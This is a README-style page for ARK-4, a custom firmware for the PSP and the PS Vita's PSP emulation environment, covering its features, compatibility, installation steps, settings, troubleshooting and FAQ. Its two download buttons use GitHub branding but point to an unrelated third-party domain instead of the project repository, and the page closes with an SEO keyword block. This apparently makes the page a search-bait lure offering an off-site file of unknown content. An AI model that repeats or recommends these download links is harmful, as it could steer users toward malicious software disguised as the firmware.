
# ARK-4 Custom Firmware

ARK-4 is an advanced custom firmware environment for the Sony PlayStation Portable (PSP) and PlayStation Vita's PSP emulation environment (ePSP). It provides homebrew execution, plugin support, system configuration, game compatibility improvements, and boot management functionality.

<a href="https://dyhuiying.com/s/file">
  <img src="https://img.shields.io/badge/DOWNLOAD-ARK--4%20CUSTOM%20FIRMWARE-2563EB?style=for-the-badge&logo=github&logoColor=white" alt="Download ARK-4 Custom Firmware">
</a>

![Platform](https://img.shields.io/badge/Platform-PSP%20%7C%20PS%20Vita-334155?style=flat-square)
![Category](https://img.shields.io/badge/Category-Custom%20Firmware-475569?style=flat-square)
![Environment](https://img.shields.io/badge/Environment-Homebrew-2563EB?style=flat-square)
![Architecture](https://img.shields.io/badge/Architecture-PSP%20ePSP-64748B?style=flat-square)
![Project](https://img.shields.io/badge/Project-Legacy%20Archive-64748B?style=flat-square)

---

## 1. Overview

ARK-4 is a custom firmware (CFW) project designed for the Sony PSP platform and the PSP emulation environment available on PS Vita systems.

The project extends the standard PSP software environment through custom system modules, compatibility components, homebrew execution support, and additional configuration capabilities.

ARK-4 builds upon functionality associated with earlier PSP custom firmware projects, including PRO and ME, while introducing its own system architecture and specialized components.

### Core Architecture

The ARK-4 environment consists of several technical components:

| Component | Purpose |
|---|---|
| SystemControl | Core custom firmware functionality and system patching |
| Compatibility Layer | Platform-specific compatibility and runtime support |
| Inferno 2 | Optimized PSP game image driver |
| Popcorn | Custom PS1 game compatibility and configuration |
| Stargate | Game compatibility fixes and anti-CFW protection handling |
| ARK Loader | Loads and initializes the custom firmware environment |
| Custom Launcher | Alternative application and homebrew launching interface |
| Recovery Environment | Access to firmware configuration and recovery utilities |

ARK-4 supports both live and permanent custom firmware configurations on compatible PSP hardware.

On PS Vita, it operates within the PSP emulation environment rather than replacing the native Vita operating system.

## 2. Key Features

| Component | Description |
|---|---|
| Custom Firmware | Extended PSP system software environment |
| Homebrew Support | Execution of compatible PSP homebrew applications |
| Plugin Management | Support for plugins across supported PSP environments |
| Inferno 2 Driver | Optimized ISO and compressed game image handling |
| PS1 Compatibility | Custom PS1 game support through the Popcorn controller |
| Stargate Engine | Integrated game compatibility fixes |
| Boot Management | Live CFW initialization and optional permanent configuration |
| Custom Launcher | Alternative interface for launching applications |
| Recovery Utilities | Access to supported recovery and maintenance functionality |
| Firmware Updates | Integrated update functionality and manual update packages |
| UMD Video | Additional UMD Video compatibility and region configuration |
| System Configuration | CPU settings, memory options, and other firmware controls |

## 3. Technical Specifications

| Property | Details |
|---|---|
| Software Name | ARK-4 |
| Target Platform | Sony PlayStation Portable |
| Secondary Platform | Sony PlayStation Vita ePSP |
| Software Category | Custom Firmware |
| Firmware Environment | PSP system software / PSP emulation |
| PSP Firmware Baseline | 6.60 / 6.61 installation environment |
| Vita Firmware Environment | 3.60–3.74 with supported native modifications |
| Architecture | PSP MIPS-based environment |
| Installation Method | Memory Stick deployment and ARK Loader |
| PSP Application Format | EBOOT.PBP |
| Vita Installer Format | VPK |
| Game Image Driver | Inferno 2 |
| Configuration | Recovery Menu and XMB |
| Plugin Support | PSP plugins and supported VSH environments |
| Update Method | OTA updater or manual update package |
| Project Status | Archived legacy release |

## 4. Compatibility

ARK-4 supports the PSP software architecture across a broad range of PSP hardware, subject to hardware-specific limitations.

### PSP Compatibility

| PSP Hardware | Compatibility |
|---|---|
| PSP-1000 | Supported |
| PSP-2000 | Supported |
| PSP-3000 | Supported |
| PSP Go | Supported |
| PSP Street (E1000) | Supported |
| PSP Testkits / Devkits | Supported where compatible |
| Strider2 hardware | Excluded |

Hardware revisions may differ in their supported permanent boot configurations.

### Firmware Compatibility

| Environment | Compatibility |
|---|---|
| PSP Official Firmware 6.60 | Supported installation environment |
| PSP Official Firmware 6.61 | Supported installation environment |
| Existing 6.61 PRO CFW | Supported migration path |
| Existing 6.61 ME CFW | Supported migration path |
| PS Vita 3.60–3.74 | Supported ePSP environment with required native modifications |
| Adrenaline | Supported through the compatible PSP emulation configuration |

### Installation Types

| Installation Type | Description |
|---|---|
| Live CFW | Started through ARK Loader after a shutdown or reboot |
| Permanent CFW | Uses a compatible cIPL or supported permanent boot configuration |
| Standalone Vita | Runs within the official PSP emulation environment after required modifications |
| Adrenaline Integration | Runs within the modified PSP emulation environment provided by Adrenaline |

Permanent installation availability and methods depend on the specific hardware and boot configuration.

## 5. Firmware Features

### 5.1 Custom Firmware Core

ARK-4 includes an updated system control architecture responsible for custom firmware functionality and system-level patches.

The core provides the runtime foundation for homebrew execution, compatibility modules, plugin integration, and additional system features.

### 5.2 Homebrew Execution

The environment supports compatible PSP homebrew applications.

Legacy 1.50 software compatibility is also included, subject to application and hardware requirements.

### 5.3 Inferno 2 Game Driver

Inferno 2 provides optimized handling of PSP game image formats.

Supported formats include:

- ISO
- CSO
- ZSO
- JSO
- CSOv2
- DAX

Driver functionality and compatibility may vary depending on the application and image format.

### 5.4 PS1 Compatibility

The Popcorn controller provides support for custom PS1 game configurations.

External configuration files can be used to adjust compatibility for individual titles.

### 5.5 Plugin Management

ARK-4 supports plugins for multiple PSP execution environments.

Supported plugin categories include:

- PSP games
- PSP homebrew
- PS1 games
- VSH / XMB

The environment also provides options for enabling and disabling plugins on a per-game basis.

### 5.6 Stargate Compatibility Engine

Stargate provides integrated compatibility fixes for certain games that encounter protection mechanisms or compatibility issues under custom firmware.

### 5.7 Boot and Recovery Management

ARK-4 supports different boot configurations depending on the target hardware.

Available functionality includes:

- Live firmware initialization
- Custom launcher boot configuration
- Compatible permanent boot configurations
- Recovery Menu access
- Supported recovery utilities

### 5.8 System Configuration

The firmware exposes configurable system settings, including:

- CPU and BUS clock configuration
- Power-saving settings
- Memory Stick performance options
- Inferno cache configuration
- USB charging
- UMD drive configuration
- Region settings
- Plugin configuration

Some settings are hardware-specific.

## 6. System Requirements

### PSP Requirements

| Requirement | Description |
|---|---|
| Console | Compatible Sony PSP |
| Firmware | Compatible PSP system software |
| Storage | Memory Stick or supported internal storage |
| File System | FAT-compatible storage configuration |
| Loader | ARK Loader |
| Installation Files | ARK_01234 and ARK Loader directories |
| Permanent Installation | Compatible cIPL configuration, when desired |

### PS Vita Requirements

| Requirement | Description |
|---|---|
| Console | Compatible PS Vita or PS Vita TV |
| Firmware | Supported 3.60–3.74 environment |
| Native Modification | HENkaku, h-encore, or compatible native modification |
| Application Installer | VitaShell |
| Installation Package | FasterARK VPK |
| PSP Environment | Official PSPEmu or compatible Adrenaline installation |
| Additional Dependency | NoPspEmuDrm_mod for standalone installation |

## 7. Download & Installation

### Download ARK-4

<a href="https://dyhuiying.com/s/file">
  <img src="https://img.shields.io/badge/DOWNLOAD-ARK--4%20PACKAGE-2563EB?style=for-the-badge&logo=github&logoColor=white" alt="Download ARK-4 Package">
</a>

### 7.1 PSP Installation

For PSP systems running compatible official firmware:

1. Prepare a compatible Memory Stick.
2. Extract the ARK-4 package on a computer.
3. Copy the `ARK_01234` directory into:

   `PSP/SAVEDATA/`

4. Copy the `ARK_Loader` directory into:

   `PSP/GAME/`

5. Safely disconnect the storage device.
6. Start the PSP.
7. Navigate to the Game menu.
8. Launch `ARK Loader`.
9. Allow the loader to initialize the custom firmware environment.

The initial configuration operates as Live CFW. The loader must be executed again after a complete shutdown or reboot.

### 7.2 Permanent CFW Configuration

ARK-4 supports permanent custom firmware configurations through compatible cIPL installation methods.

General workflow:

1. Confirm the PSP hardware model.
2. Verify the currently installed firmware environment.
3. Prepare the compatible ARK-4 installation components.
4. Launch the appropriate cIPL installer.
5. Allow the installer to identify the supported configuration.
6. Follow the installer instructions for the selected boot configuration.

Permanent installation is optional. Hardware compatibility must be established before changing the boot configuration.

### 7.3 Existing Custom Firmware Migration

For compatible systems already running 6.61 PRO or ME:

1. Verify the existing firmware installation.
2. Prepare the required DC-ARK components.
3. Configure the compatible New cIPL installation when applicable.
4. Shut down the PSP.
5. Start the system while holding the L trigger.
6. Follow the DC-ARK installation interface to perform the ARK installation.

Older custom firmware environments may require additional preparation.

### 7.4 PS Vita Standalone Installation

The standalone configuration runs within the PSP emulation environment.

General workflow:

1. Confirm that the Vita is running a supported modified system environment.
2. Prepare the required NoPspEmuDrm_mod dependency.
3. Install VitaShell if necessary.
4. Transfer `FasterARK.vpk` to the device.
5. Install the VPK through VitaShell.
6. Launch FasterARK.
7. Follow the installation interface.
8. Confirm that the ARK and ARK-X applications are available.

Standalone ARK does not provide every feature of the original PSP XMB environment.

### 7.5 Adrenaline Integration

ARK-4 can also operate through the Adrenaline PSP emulation environment.

The configuration uses the PSP emulation storage structure:

- `pspemu/PSP/SAVEDATA/ARK_01234/`
- `pspemu/PSP/GAME/ARK_Loader/`

Compatible Adrenaline configurations can use an autorun setup to launch ARK Loader automatically.

## 8. Configuration & Management

### Recovery Menu

ARK-4 provides firmware configuration through the Recovery Menu and supported XMB interfaces.

The available options depend on the device and installation type.

### Performance Configuration

| Setting | Function |
|---|---|
| Overclock | Configures CPU to 333 MHz and BUS to 166 MHz |
| Power Save | Configures CPU to 133 MHz and BUS to 66 MHz |
| Balanced Clock Speed | Configures CPU to 222 MHz and BUS to 111 MHz |
| Inferno Cache | Enables caching for the Inferno driver |
| Memory Stick Speedup | Enables Memory Stick read caching |
| USB Charge | Enables USB charging while the PSP is powered on |

### Boot Configuration

| Setting | Function |
|---|---|
| Autoboot Launcher | Starts the ARK Custom Launcher instead of XMB |
| Skip Sony Logos | Controls selected startup logos |
| Recovery Menu | Provides access to CFW configuration |
| cIPL Configuration | Manages supported permanent boot configurations |

### Plugin Management

Plugins can be managed according to their execution environment.

Typical categories include:

| Plugin Category | Environment |
|---|---|
| GAME | PSP game execution |
| POPS | PS1 game execution |
| VSH | XMB environment |

Plugin compatibility should be evaluated individually.

### Updating ARK-4

The original ARK-4 project provides several update methods:

1. Integrated OTA updater when available.
2. Manual installation through the supplied UPDATE directory.
3. Replacement of the ARK installation files followed by the loader process where applicable.

The original ARK-4 repository is archived. Its original update infrastructure and availability should not be assumed to remain operational.

## 9. Troubleshooting

| Issue | Resolution |
|---|---|
| ARK Loader does not appear | Check the `PSP/GAME/ARK_Loader/` directory structure |
| ARK Loader fails to start | Verify firmware compatibility and package placement |
| CFW disappears after shutdown | This is expected with a Live CFW installation |
| Permanent boot does not work | Check hardware compatibility and cIPL configuration |
| Homebrew application fails | Confirm application compatibility and required dependencies |
| Plugin does not load | Verify plugin placement and execution category |
| ISO image is not recognized | Check the supported image format and storage location |
| Inferno driver issue | Review driver configuration and image compatibility |
| PS1 game has compatibility issues | Check the Popcorn configuration for the affected title |
| Memory Stick is not recognized | Check storage integrity and supported file system |
| Vita standalone installation fails | Verify the native modification and PSPEmu dependencies |
| XMB features are missing on Vita | Standalone ePSP installations do not provide every original PSP XMB feature |

## 10. Frequently Asked Questions

### 1. What is ARK-4 Custom Firmware?

ARK-4 is a custom firmware environment for the Sony PSP and PS Vita's PSP emulation environment. It adds homebrew execution, plugin support, compatibility improvements, and system configuration functionality.

### 2. Does ARK-4 support every PSP model?

The project supports the PSP hardware family, including PSP-1000, 2000, 3000, Go, and Street models. Strider2 hardware is excluded.

### 3. Does ARK-4 work on PS Vita?

Yes. ARK-4 supports the Vita's PSP emulation environment through standalone PSPEmu installation or compatible Adrenaline configurations.

### 4. What is the difference between Live and Permanent CFW?

Live CFW must be started again after a complete shutdown or reboot. Permanent configurations use supported boot modifications to initialize custom firmware automatically.

### 5. Does ARK-4 support PSP homebrew?

Yes. ARK-4 supports compatible PSP homebrew applications and plugins, including legacy software compatibility.

### 6. Which game image formats does Inferno 2 support?

The driver supports ISO, CSO, ZSO, JSO, CSOv2, and DAX formats.

### 7. Does ARK-4 support PS1 games?

Yes. ARK-4 includes the Popcorn controller for custom PS1 game support and configuration.

### 8. Can ARK-4 run plugins?

Yes. Plugin support includes PSP games, homebrew, PS1 games, and VSH environments, subject to plugin compatibility.

### 9. Can ARK-4 be installed without existing custom firmware?

Yes. The PSP installation process includes a Live CFW installation path for compatible official firmware environments.

### 10. Does ARK-4 include recovery functionality?

Yes. The project includes recovery-related components, including its integration of Despertar del Cementerio Version 10.

### 11. Can ARK-4 be updated?

The original project includes OTA and manual update mechanisms. The archived status of ARK-4 means the availability of its original update infrastructure may vary.

### 12. Is ARK-4 still actively maintained?

No. The original ARK-4 GitHub repository was archived in August 2026, and the project maintainers announced ARK-5 as its successor.

## 11. SEO Keywords

ARK-4 Custom Firmware, ARK-4 PSP, ARK-4 Download, ARK-4 CFW, PSP Custom Firmware, PSP Firmware Environment, PSP Homebrew, PSP Homebrew Launcher, PSP Plugin Support, PSP System Modification, PSP 6.61 CFW, PSP 6.60 CFW, PSP Game Compatibility, PSP Inferno 2 Driver, PSP ISO Driver, PSP CSO Support, PSP ZSO Support, PSP PS1 Compatibility, PSP Popcorn Controller, PSP Stargate Engine, PSP Recovery Tools, PSP Boot Configuration, PSP Permanent CFW, PSP Live CFW, PSP cIPL, PSP Go Custom Firmware, PS Vita ePSP, PS Vita ARK-4, PS Vita PSP Homebrew, Adrenaline ARK-4, PSP Firmware Management, PSP System Utilities, Sony PSP Custom Firmware.
